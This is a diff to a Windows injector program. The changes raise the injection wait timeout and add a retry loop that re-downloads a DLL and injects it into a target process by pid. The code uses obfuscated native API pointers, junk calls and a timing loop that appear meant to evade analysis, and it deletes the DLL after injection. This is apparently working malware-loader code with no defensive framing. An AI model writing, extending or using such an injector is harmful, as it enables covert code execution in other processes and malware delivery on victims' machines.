@@ -733,7 +733,7 @@ static bool _Inject(DWORD pid, const wchar_t* dllPath) {
     
     bool inj=false;
     if(hT){
-        if(_WFS)_WFS(hT,10000);
+        if(_WFS)_WFS(hT,30000);
         ULONGLONG remoteMH=0;
         if(_NtRVM)_NtRVM(hp,(PVOID)(remoteData+256+16),&remoteMH,8,NULL);
         inj=(remoteMH!=0);
@@ -799,7 +799,14 @@ int WINAPI WinMain(HINSTANCE,HINSTANCE,LPSTR lpCmd,int){
     _Junk();
     { volatile DWORD d=0; for(int i=0;i<50;i++){ d+=GetTickCount(); _Junk(); } }
 
-    bool inj=_Inject(pid,dllPath);
+    bool inj=false;
+    for(int attempt=0;attempt<5&&!inj;attempt++){
+        if(attempt){
+            _Sleep(3000);
+            if(authed && attempt%2==0) _Download(dllPath);
+        }
+        inj=_Inject(pid,dllPath);
+    }
     if(inj) _DelDll(dllPath);
     _Junk();
     return inj?0:2;
